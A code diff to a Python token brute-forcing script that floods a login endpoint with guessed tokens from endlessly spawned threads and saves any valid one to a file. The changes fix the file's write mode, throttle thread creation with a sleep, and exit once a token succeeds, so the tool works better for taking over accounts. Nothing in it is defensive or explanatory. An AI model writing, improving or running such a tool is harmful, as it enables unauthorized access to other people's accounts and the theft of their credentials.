@@ -5,6 +5,7 @@ import sys
 from colorama import Fore
 import requests
 import threading
+from time import sleep
 
 def main():
         print(Fore.CYAN + 'Start Token Brute Forcing\n\n')
@@ -24,8 +25,9 @@ def main():
                 try:
                     if login.status_code == 200:
                         print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} VALID' + ' ' + token)
-                        f = open('util/bruteforced.txt')
+                        f = open('util/bruteforced.txt', 'w')
                         f.write(f'{token}\n')
+                        sys.exit(input('[>]Token hitted! (kind of lucky ngl)\n[>]Press enter: ')) 
                     else:
                         print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} INVALID' + ' ' + token)
                 finally:
@@ -34,7 +36,6 @@ def main():
         def thread():
             while True:
                 threading.Thread(target=bruteforece).start()
+                sleep(1)
 
         thread()
-
-        sys.exit(input('[>]Token hitted! (kind of lucky ngl)\n[>]Press enter: ')) 
